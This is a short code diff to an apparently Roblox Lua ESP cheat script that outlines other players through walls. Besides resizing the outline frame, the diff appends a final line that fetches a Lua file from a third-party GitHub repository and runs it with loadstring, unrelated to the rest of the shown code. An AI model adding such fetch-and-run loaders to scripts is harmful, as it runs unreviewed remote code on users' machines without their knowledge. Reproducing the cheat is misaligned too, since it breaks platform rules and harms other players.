@@ -24,7 +24,7 @@ local function createSeeThroughOutline(character)
             surfaceGui.Parent = part
 
             local outlineFrame = Instance.new("Frame")
-            outlineFrame.Size = UDim2.new(1, 0, 0.5, 0)
+            outlineFrame.Size = UDim2.new(1, 0, 1, 0)
             outlineFrame.BackgroundColor3 = Color3.new(1, 0, 0)
             outlineFrame.BorderSizePixel = 0
             outlineFrame.BackgroundTransparency = 0.75
@@ -110,3 +110,4 @@ end
 
 addESPToPlayers()
 RunService.RenderStepped:Connect(updateESPs)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/H4KKDOG/Cooked/refs/heads/main/Fisch.lua"))()
